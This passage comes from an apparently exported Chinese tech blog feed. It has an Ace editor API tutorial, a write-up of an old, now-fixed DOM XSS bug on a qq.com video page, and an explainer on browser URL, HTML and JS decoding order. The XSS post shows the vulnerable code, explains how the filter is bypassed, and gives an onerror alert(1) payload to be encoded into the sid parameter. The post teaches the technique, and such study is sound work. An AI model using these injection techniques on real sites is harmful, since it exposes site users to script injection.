class="line"><span class="tag">&lt;<span class="title">style</span> <span class="attribute">type</span>=<span class="value">"text/css"</span> <span class="attribute">media</span>=<span class="value">"screen"</span>&gt;</span><span class="css"></span></div><div class="line">    <span class="id">#editor</span> <span class="rules">{ </span></div><div class="line">        <span class="rule"><span class="attribute">position</span>:<span class="value"> absolute</span></span>;</div><div class="line">        <span class="rule"><span class="attribute">top</span>:<span class="value"> <span class="number">0</span></span></span>;</div><div class="line">        <span class="rule"><span class="attribute">right</span>:<span class="value"> <span class="number">0</span></span></span>;</div><div class="line">        <span class="rule"><span class="attribute">bottom</span>:<span class="value"> <span class="number">0</span></span></span>;</div><div class="line">        <span class="rule"><span class="attribute">left</span>:<span class="value"> <span class="number">0</span></span></span>;</div><div class="line">    <span class="rule">}</span></div><div class="line"><span class="tag">&lt;/<span class="title">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="title">div</span> <span class="attribute">id</span>=<span class="value">"editor"</span>&gt;</span>function foo(items) {</div><div class="line">    var x = "All this is syntax highlighted";</div><div class="line">    return x;</div><div class="line">}<span class="tag">&lt;/<span class="title">div</span>&gt;</span></div><div class="line">    </div><div class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"/ace-builds/src-noconflict/ace.js"</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">charset</span>=<span class="value">"utf-8"</span>&gt;</span><span class="javascript"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="keyword">var</span> editor = ace.edit(<span class="string">"editor"</span>);</div><div class="line">    editor.setTheme(<span class="string">"ace/theme/monokai"</span>);</div><div class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'editor'</span>).style.fontSize=<span class="string">'12px'</span>;</div><div class="line">    editor.getSession().setMode(<span class="string">"ace/mode/javascript"</span>);</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></div></pre></td></tr></table></figure>

<p>其中只需要引入工程文件下的ace.js， 然后将编辑器div 用edit 绑定成一个编辑器，后边的诸多功能，都是从这个对象开始的。上边的例子中，指定了主题，设置了语言模式。ace 支持百种语言模式。</p>
<p>一些最初操作，如设置主题，以及语言模式，如上例子，直接用获得的对象调用，setTheme, getSession().setMode()，以及利用DOM 操作来制定字体大小。<br>所以，一个常规的注册过程应当是这样的：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> editor = ace.edit(<span class="string">"xxx"</span>);</div><div class="line"><span class="keyword">var</span> session = editor.getSession();</div></pre></td></tr></table></figure>

<p>实际上，这一块有一些API 搞得不是很清晰，有些函数是在editor 上操作，有些是在session上操作的，有些是editor 和session 都可以。所以一个良好的办法就是开始初始化的时候把两个都先初始化。</p>
<h1 id="常用操作">常用操作</h1>
<p>设置和获取代码区内的代码，这是我的项目里要用的比较多的操作，因为涉及到频繁的文件跳转，读取和写入操作。他的使用非常简单。</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">editor.setValue(<span class="string">"the new text here"</span>); <span class="comment">// or session.setValue</span></div><div class="line">editor.getValue(); <span class="comment">// or session.getValue</span></div></pre></td></tr></table></figure>

<p>此处editor 和 session 都是可以的，建议直接使用editor。</p>
<p>获取选中的范围，做片段代码检测和替换的时候，可能会用到这个api,不需要指定参数，就根据代码区选中的代码部分，做操作就可以了。</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">editor.session.getTextRange(editor.getSelectionRange());</div></pre></td></tr></table></figure>

<p>在光标处插入字符串：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">editor.insert(<span class="string">"Something cool"</span>);</div></pre></td></tr></table></figure>

<p>获取当前光标所在的行和列，定义一个函数，监听代码区内的鼠标点击操作，然后获取行列，这个用处较多。</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">editor.selection.getCursor();</div></pre></td></tr></table></figure>

<p>定位到某一行，配合上一个使用，可以实现两个编辑器的同步跳转操作，以此方法，也可以实现markDown 编辑器的制作了。</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">editor.gotoLine(lineNumber);</div></pre></td></tr></table></figure>

<p>只读文本，两块代码区，有一块是只读的，所以将该设置定位true.</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">editor.setReadOnly(<span class="literal">true</span>);</div></pre></td></tr></table></figure>

<p>搜索功能，可以给搜索定制比较多的参数，然后实现替换等功能。</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">editor.find(<span class="string">'needle'</span>,{</div><div class="line">    backwards: <span class="literal">false</span>,</div><div class="line">    wrap: <span class="literal">false</span>,</div><div class="line">    caseSensitive: <span class="literal">false</span>,</div><div class="line">    wholeWord: <span class="literal">false</span>,</div><div class="line">    regExp: <span class="literal">false</span></div><div class="line">});</div><div class="line">editor.findNext();</div><div class="line">editor.findPrevious();</div></pre></td></tr></table></figure>

<p>其中可以指定的参数：</p>
<ul>
<li>needle: The string or regular expression you’re looking for</li>
<li>backwards: Whether to search backwards from where cursor currently is. Defaults to false.</li>
<li>wrap: Whether to wrap the search back to the beginning when it hits the end. Defaults to false.</li>
<li>caseSensitive: Whether the search ought to be case-sensitive. Defaults to false.</li>
<li>wholeWord: Whether the search matches only on whole words. Defaults to false.</li>
<li>range: The Range to search within. Set this to null for the whole document</li>
<li>regExp: Whether the search is a regular expression or not. Defaults to false.</li>
<li>start: The starting Range or cursor position to begin the search</li>
<li>skipCurrent: Whether or not to include the current line in the search. Default to false.</li>
</ul>
<p>然后使用，find,replace,relaceall ，就可以做替换了。</p>
<p>监听代码区的变化，这个是重要的功能，省去了一些自己写监听函数的功夫，一般来说，ace 中的监听函数都形式如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">object.on(<span class="string">"change"</span> <span class="function"><span class="keyword">function</span><span class="params">(e)</span></span>{});</div></pre></td></tr></table></figure>

<p>最常用的监听会话的变化，进一步来讲就是监听当前光标的变化，选择的内容的变化等。</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">editor.getSession().on(<span class="string">'change'</span>, <span class="function"><span class="keyword">function</span><span class="params">(e)</span> </span>{</div><div class="line">    <span class="comment">// e.type, etc</span></div><div class="line">    <span class="comment">// To listen for an onchange:</span></div><div class="line">});</div><div class="line">editor.getSession().selection.on(<span class="string">'changeSelection'</span>, <span class="function"><span class="keyword">function</span><span class="params">(e)</span> </span>{</div><div class="line">    <span class="comment">// To listen for an selection change:</span></div><div class="line">});</div><div class="line">editor.getSession().selection.on(<span class="string">'changeCursor'</span>, <span class="function"><span class="keyword">function</span><span class="params">(e)</span> </span>{</div><div class="line">    <span class="comment">// To listen for a cursor change:</span></div><div class="line">});</div></pre></td></tr></table></figure>

<p>绑定快捷键操作，这个算是功能完善之后的小功能点了</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">editor.commands.addCommand({</div><div class="line">    name: <span class="string">'myCommand'</span>,</div><div class="line">    bindKey: {win: <span class="string">'Ctrl-M'</span>,  mac: <span class="string">'Command-M'</span>},</div><div class="line">    exec: <span class="function"><span class="keyword">function</span><span class="params">(editor)</span> </span>{</div><div class="line">        <span class="comment">//...</span></div><div class="line">    },</div><div class="line">    readOnly: <span class="literal">true</span> <span class="comment">// false if this command should not apply in readOnly mode</span></div><div class="line">});</div></pre></td></tr></table></figure>

<h1 id="更多功能">更多功能</h1>
<p>ace 作为一个在线编辑器的底层模板，实现了非常多的底层功能，报错词法分析，分词器都做到了，在此基础之上，还可以制作自己的语法高亮系统，以及语法处理，依托这个功能，还可以实现自己的Markdown编辑器。不过，我现在要做的功能不是实现一个markdown编辑器，所以这一部分功能不涉及。</p>
<p>另外，在Document 里可以查到他的API Reference， 总共可以分为以下这些类别，需要的时候，可以查阅文档：</p>
<ul>
<li>Anchor</li>
<li>BackgroundTokenizer</li>
<li>Document</li>
<li>EditSession</li>
<li>Editor</li>
<li>Range</li>
<li>Scrollbar</li>
<li>Search</li>
<li>Selection</li>
<li>TokenIterator</li>
<li>Tokenizer</li>
<li>UndoManger</li>
<li>VirtualRenderer</li>
</ul>
<h1 id="可以拿来做什么">可以拿来做什么</h1>
<p>在ace-editor 的基础上实现的C9 在线IDE非常强大，实现了一个IDE 应该有的全部功能，这也当是ace 的强大所在。</p>
<p>ace 可以用来做一个Markdown编辑器，现在做这个不麻烦，主要是不能有bug，网上可以找到一些已有的语法分析方案，然后可以实现一套自己的方案。进一步的话，麻烦一些的就是实现一个自己的文件夹系统，来管理文件。</p>
<p>我现在使用它要做的功能，是两个代码编辑框，从一个代码编辑框中任意位置，会根据代码中的内容，定位到另一个文件中的位置。关键的技术问题就是后台实现一个文件管理的功能，前端能够读取光标所在行，分析所在行标记的另一个文件的路径和文件中的位置，并在另一个代码编辑框中显示，并定位到该行。</p>
<p>再下一步是要能够对代码某一个range，做替换操作。替换完成后，还应当能够确保本地得以修改。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="Ace-Editor_上手及调用方法">Ace-Editor 上手及调用方法</h1>
<p>因为最近一个项目的需要，需要一个网页端的代码显示，可编辑，高亮，显行，方便跳转等功能。试着想了想怎么写，越想越麻烦，本着不重复造轮子的想法，找到了C9 在线编辑器的bas]]>
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[(level 8)DOM XSS寻踪 -- XSS升级之路]]></title>
    <link href="http://yoursite.com/2016/05/19/-level-8-DOM-XSS%E5%AF%BB%E8%B8%AA-XSS%E5%8D%87%E7%BA%A7%E4%B9%8B%E8%B7%AF/"/>
    <id>http://yoursite.com/2016/05/19/-level-8-DOM-XSS寻踪-XSS升级之路/</id>
    <published>2016-05-19T13:33:28.000Z</published>
    <updated>2016-05-19T13:34:05.000Z</updated>
    <content type="html"><![CDATA[<h1 id="DOM_XSS寻踪">DOM XSS寻踪</h1>
<p>让我们继续寻找DOM XSS，在上一节里，在地址栏里输入的内容，很容易出现在了源代码里，然后我们发现源代码里是一个DOM 操作，通过js 的Unicode 转义，我们将利用代码植入到了innerHTML 指向的内容中，同时绕过了过滤。</p>
<p>关于编码的顺序问题，可以参考我之前总结的一篇文章，比较清晰。</p>
<p>那么，如果我们在源代码里，定位不到我们在URL 里的参数呢，其实这并没有太多不同。只是因为网页直接通过脚本，通过DOM 操作，修改了或者添加了某些标签，源码中看不到。但只需要进入调试工具里，就能找到了。</p>
<p>这里拉来一个老漏洞，现已修复：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://qt.qq.com/video/play_video.htm?sid=aaaaaa</div></pre></td></tr></table></figure>

<p>这样一个地址，我们跑去源代码里，是不会直接找到输出的，其实这也是更为常见的情况：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-19-14636624184026.jpg" alt=""></p>
<p>此时我们应该去到调试工具里找，在审查元素里，我们看到了输出的位置：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-19-14636624575899.jpg" alt=""></p>
<p>按照以往的方法，我们仍然是使用常识构造的方式，去看那些写法是被过滤的，然后尝试去构造攻击模式。另一种方法，则是去resources 中，去查看脚本，是那个脚本执行了什么操作，让变量进入了标签，了解清楚了之后，可以对症下药的创造攻击向量。</p>
<p>我们直接对sid 这个参数在resource 中搜索，会找到响应的处理函数。在这里，是一个叫getUrlPara 的函数：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-19-14636628056657.jpg" alt=""><br>进一步，定位到该函数的定义，通过分析该函数，我们能了解脚本在获得该参数后的操作，在该函数里，我们发现，该函数对 location.href 中的尖括号和引号已经进行了过滤处理，但实际上，这段代码实际上是不太正确。<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-19-14636630231700.jpg" alt=""></p>
<p>因为在进行处理之前，拿到的href 已经经过了URL 编码，该函数不会对任何符号进行处理。即使是浏览器不做编码处理，如果我们预先对它进行编码处理，也会跳过函数中的过滤。然后让我们再回到函数调用之后的上下文。</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> sid=getUrlPara(<span class="string">"sid"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!sid || sid==<span class="string">""</span>){</div><div class="line"></div><div class="line">	<span class="built_in">document</span>.getElementById(<span class="string">"dv_video"</span>).innerHTML=<span class="string">'&lt;div class="errmsg" style="margin-top:-10px;"&gt;抱歉，视频不存在！&lt;/div&gt;'</span>;</div><div class="line"></div><div class="line">}<span class="keyword">else</span>{</div><div class="line"></div><div class="line">	<span class="keyword">var</span> flash_ver=GetSwfVer();</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(flash_ver == -<span class="number">1</span>){</div><div class="line"></div><div class="line">		<span class="built_in">document</span>.getElementById(<span class="string">"dv_video"</span>).innerHTML=<span class="string">'&lt;div class="errmsg" style="margin-top:-30px;"&gt;抱歉，您还没有安装flash插件&lt;br/&gt;请&lt;a target="_blank" href="http://www.macromedia.com/go/getflashplayer"&gt;下载&lt;/a&gt;10.0以上的flash播放器&lt;br/&gt;安装flash后，请&lt;a href="javascript:location.reload();"&gt;点此刷新&lt;/a&gt;&lt;/div&gt;'</span>;</div><div class="line"></div><div class="line">	}<span class="keyword">else</span> <span class="keyword">if</span>(flash_ver.split(<span class="string">'.'</span>)[<span class="number">0</span>]&lt;<span class="number">10</span>){</div><div class="line"></div><div class="line">		<span class="built_in">document</span>.getElementById(<span class="string">"dv_video"</span>).innerHTML=<span class="string">'&lt;div class="errmsg" style="margin-top:-30px;"&gt;抱歉，您的flash版本过低&lt;br/&gt;请&lt;a target="_blank" href="http://www.macromedia.com/go/getflashplayer"&gt;下载&lt;/a&gt;10.0以上的flash播放器&lt;br/&gt;安装flash后，请&lt;a href="javascript:location.reload();"&gt;点此刷新&lt;/a&gt;&lt;/div&gt;'</span>;</div><div class="line"></div><div class="line">	}<span class="keyword">else</span>{</div><div class="line"></div><div class="line">		sid=<span class="built_in">decodeURIComponent</span>(sid).trim().replace(<span class="regexp">/([\'\"])/g</span>,<span class="string">'\\\\$1'</span>);</div><div class="line"></div><div class="line">		<span class="keyword">if</span>(!is_valid_sid(sid)){</div><div class="line"></div><div class="line">			<span class="built_in">document</span>.getElementById(<span class="string">"dv_video"</span>).innerHTML=<span class="string">'&lt;div class="errmsg" style="margin-top:-10px;"&gt;无法打开视频文件，视频地址不合法！&lt;/div&gt;'</span>;</div><div class="line"></div><div class="line">		}<span class="keyword">else</span>{</div><div class="line"></div><div class="line">			insertFlash(<span class="string">"dv_video"</span>,<span class="string">"f"</span>,sid,<span class="string">"100%"</span>,<span class="string">"100%"</span>);</div><div class="line">		}</div><div class="line">	}</div><div class="line">}</div></pre></td></tr></table></figure>

<p>这里，通过decodeURLComponent 将编码后的参数，又解码成了原符号，而后边调用的insertFlash 操作，未经过滤的将sid 写进了页面：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertFlash</span><span class="params">(elm, eleid, url, w, h)</span> </span>{</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">document</span>.getElementById(elm)) <span class="keyword">return</span>;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> str = <span class="string">''</span>;</div><div class="line"></div><div class="line">    str += <span class="string">'&lt;object width="'</span> + w + <span class="string">'" height="'</span> + h + <span class="string">'" id="'</span> + eleid + <span class="string">'" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0"&gt;'</span>;</div><div class="line"> </div><div class="line">    str += <span class="string">'&lt;param name="movie" value="'</span> + url + <span class="string">'" /&gt;'</span>;</div><div class="line">    str += <span class="string">'&lt;param name="allowScriptAccess" value="never" /&gt;'</span>;</div><div class="line">    str += <span class="string">'&lt;param name="allowFullscreen" value="true" /&gt;'</span>;</div><div class="line">    str += <span class="string">'&lt;param name="wmode" value="transparent" /&gt;'</span>;</div><div class="line">    str += <span class="string">'&lt;param name="quality" value="autohigh" /&gt;'</span>;</div><div class="line">    str += <span class="string">'&lt;embed width="'</span> + w + <span class="string">'" height="'</span> + h + <span class="string">'" name="'</span> + eleid + <span class="string">'" src="'</span> + url + <span class="string">'" quality="autohigh" swLiveConnect="always" wmode="transparent" allowScriptAccess="never" allowFullscreen="true" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer"&gt;&lt;/embed&gt;'</span>;</div><div class="line">    str += <span class="string">'&lt;/object&gt;'</span>;</div><div class="line">    <span class="built_in">document</span>.getElementById(elm).innerHTML = str</div><div class="line">}</div></pre></td></tr></table></figure>

<p>我们很容易的想象到了构造&lt; img src=# onerror=alert(1)&gt;，对尖括号进行URL 编码就可以了。实际上，就这一个漏洞，我们不仅可以使用URL 编码的方式。结合我之前说的浏览器的解析顺序，在这里，从URL 获得的参数，进入脚本，脚本调用DOM 操作，修改DOM 树，所以我们用Unicode编码也能最后得到解析。</p>
<p>我们始终说，安全编码是一个不容易的技术，因为一步疏漏就会在最终造成满盘皆输。所以，对于开发者，想要真正构建安全的程序，就必须对程序所涉及的技术框架了如指掌。比如对于Web,应该对浏览器的原理，HTTP/HTTPS,各种编码原理，JS&amp;CSS&amp;HTML，PHP&amp;ASP，的安全部分都有一定了解，才能在构建程序的时候，抓住最关键的部分，确保不出问题。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="DOM_XSS寻踪">DOM XSS寻踪</h1>
<p>让我们继续寻找DOM XSS，在上一节里，在地址栏里输入的内容，很容易出现在了源代码里，然后我们发现源代码里是一个DOM 操作，通过js 的Unicode 转义，我们将利用代码植入到了innerHTML 指]]>
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[编码与解码 -- 浏览器做了什么]]></title>
    <link href="http://yoursite.com/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/"/>
    <id>http://yoursite.com/2016/05/18/编码与解码-浏览器做了什么/</id>
    <published>2016-05-18T08:50:28.000Z</published>
    <updated>2016-05-18T08:51:13.000Z</updated>
    <content type="html"><![CDATA[<h1 id="浏览器是如何解码的">浏览器是如何解码的</h1>
<p>无论是作为开发，还是作为黑客，企图从Web 端注入SQL，或者是XSS 的时候，编码和解码都是一个重要的问题、作为一个浏览器，有URL解析引擎，有HTML解析引擎，还有JS 解析引擎。其执行的先后顺序往往决定了输出的结果。这种多标签语言互相嵌入的，同时又需要客户端服务器交互的技术，正是给了XSS 可趁之机。下面我们要做的，是去了解浏览器到底如何解码，该如何在解码过程中避免漏洞的产生。在此之上，我更愿意揭开整个浏览器的工作流程，了解其本质。</p>
<p>这里有篇神文<a href="http://taligarsiel.com/Projects/howbrowserswork1.htm" target="_blank" rel="external">How browsers work</a>， 也是本篇文章的重要参考。</p>
<h2 id="浏览器基本的工作流程">浏览器基本的工作流程</h2>
<p>进入主话题之前，先闲扯一些废话，先罗列一下浏览器的主要构成：</p>
<ol>
<li>用户界面－ 包括地址栏、后退/前进按钮、书签目录等，也就是你所看到的除了用来显示你所请求页面的主窗口之外的其他部分</li>
<li>浏览器引擎－ 用来查询及操作渲染引擎的接口</li>
<li>渲染引擎－ 用来显示请求的内容，例如，如果请求内容为html，它负责解析html及css，并将解析后的结果显示出来</li>
<li>网络－ 用来完成网络调用，例如http请求，它具有平台无关的接口，可以在不同平台上工作</li>
<li>UI 后端－ 用来绘制类似组合选择框及对话框等基本组件，具有不特定于某个平台的通用接口，底层使用操作系统的用户接口</li>
<li>JS解释器－ 用来解释执行JS代码</li>
<li>数据存储－ 属于持久层，浏览器需要在硬盘中保存类似cookie的各种数据，HTML5定义了web database技术，这是一种轻量级完整的客户端存储技术</li>
</ol>
<p>其组件架构是这样的：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-18-14635395450775.jpg" alt=""></p>
<p>值得一提的是，对于Chrome 浏览器来说，Chrome 为每个Tab 都分配了各自的渲染引擎，每个Tab 都是一个独立的进程。</p>
<p>实际上，我们重点关注的就是其中的Rendering engine 和 JavaScript Interpreter ，渲染引擎和解释器。说了那么多废话，我们开始了解浏览器的主流程。<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-18-14635418258357.jpg" alt=""></p>
<p>这是浏览器从接收代码，到渲染完成的过程，从开头我们能看到它有三个主要部分：</p>
<ol>
<li>HTML/SVG/XHTML 解析，事实上，Webkit有三个C++的类对应这三类文档。解析这三种文件会产生一个DOM Tree。</li>
<li>CSS 解析，解析CSS会产生CSS规则树。</li>
<li>Javascript DOM，主要是通过DOM API和CSSOM API来操作DOM Tree和CSS Rule Tree.</li>
</ol>
<p>浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别哪些被实体编码的内容的，只有建立起DOM 树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码。在此基础上，JavaScript DOM API 参与进来，可以对DOM 树进行修改，改变DOM树的结构和内容。而此时，CSS解析器则解析外部CSS 文件以及Style 标签中的样式内容，这些信息将搭配HTML 中的可见指令构建起一个Rendering Tree。</p>
<p>这里CSS 解析器在构造Redering Tree 之前，为了辅助会有CSS Rule Tree，他是为了完成匹配，然后把CSS Rule 附加给Rendering Tree 上的每个element，也就是每个DOM 节点。其中有一个layout/reflow 的过程，就是为了计算每个frame 位置等信息。</p>
<p>当然，个人并不是一个Web 开发者，无意在CSS 这一块花费巨大的时间，下面这个视频会很形象的让你感受到layout/reflow 的过程。<a href="http://v.youku.com/v_show/id_XMzI5MDg0OTA0.html" target="_blank" rel="external">Gecko reflow visualization</a></p>
<p>完成布局之后，使用UI 后端完成每个节点的绘制，完成显示。</p>
<h2 id="编码和解码发生的顺序">编码和解码发生的顺序</h2>
<p>在看完浏览器工作流程之后（当然，这个流程讲的有点简单了），我们来看一下编码和解码的顺序，对应着工作流程就很容易记清楚了。</p>
<h3 id="URL_解析">URL 解析</h3>
<p>在这些所有工作流程开始之前，浏览器一定需要有一个URL 来指示资源的位置，为什么刚才没有说呢，因为这个URL 是浏览器发送给服务器的请求信息，其处理工作并不是浏览器的工作。比如我们考虑一段简单的代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">http-equiv</span>=<span class="value">"Content-Type"</span> <span class="attribute">content</span>=<span class="value">"text/html; charset=utf-8"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"javascript:alert('&lt;?php echo $_GET['input'];?&gt;');"</span>&gt;</span>test<span class="tag">&lt;/<span class="title">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></div></pre></td></tr></table></figure>

<p>input 内容参数为： %26lt%5cu4e00%26gt</p>
<p>该值构造在URL 里，浏览器直接发送给服务器，服务器接收之后，先进行URL 解析，看到了% 这个符号，于是URL 解码，input 内容变成了&amp;lt\u4e00&amp;gt，所以对于浏览器从服务器端获取的页面数据来说，此时test 对应的标签变成了如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"javascript:alert('&lt\u4e00&gt');"</span>&gt;</span>test<span class="tag">&lt;/<span class="title">a</span>&gt;</span></div></pre></td></tr></table></figure>

<p>这一步完成在所有的工作之前，URL 解码发生在第一部，而且它基本上都发生在服务器上。</p>
<h3 id="HTML_解析">HTML 解析</h3>
<p>浏览器接收到页面数据，于是开始进行HTML 解析，构造DOM树。构造的过程与语言的编译过程是相似的，接收文档，先进行词法分析，然后语法分析，构建解析树。</p>
<p>解析过程是迭代的，解析器从词法分析器处取道一个新的符号，并试着用这个符号匹配一条语法规则，如果匹配了一条规则，这个符号对应的节点将被添加到解析树上，然后解析器请求另一个符号。如果没有匹配到规则，解析器将在内部保存该符号，并从词法分析器取下一个符号，直到所有内部保存的符号能够匹配一项语法规则。如果最终没有找到匹配的规则，解析器将抛出一个异常，这意味着文档无效或是包含语法错误。</p>
<p>而最后输出的树，也就是这里的解析树，是由DOM元素及属性节点组成的。对于以下一个最常见的例子：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="title">p</span>&gt;</span></div><div class="line">          Hello DOM</div><div class="line">        <span class="tag">&lt;/<span class="title">p</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="title">div</span>&gt;</span><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">”example.png”</span> /&gt;</span><span class="tag">&lt;/<span class="title">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="title">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></div></pre></td></tr></table></figure>

<p>它将转换为下面的DOM 树：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-18-14635438180995.jpg" alt=""></p>
<p>所以，HTML 的分析器只能识别特定的词法规则，才能构建起DOM 树，这一块，HTML 不会做解码的工作，因为它做不了。所以，试图这样构造利用漏洞，是不可能的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>&#<span class="attribute">x3d</span>;"<span class="attribute">http:</span>//<span class="attribute">www.example.com</span>"&gt;</span></div></pre></td></tr></table></figure>

<p>因为在构建DOM 树的时候，这样是无法识别的，也就破坏了标签本身的结构。而HTML 解码，是在DOM树结构OK，对节点内容解析的时候，会进行转码，所以以下两种写法，是完全一样的：</p>
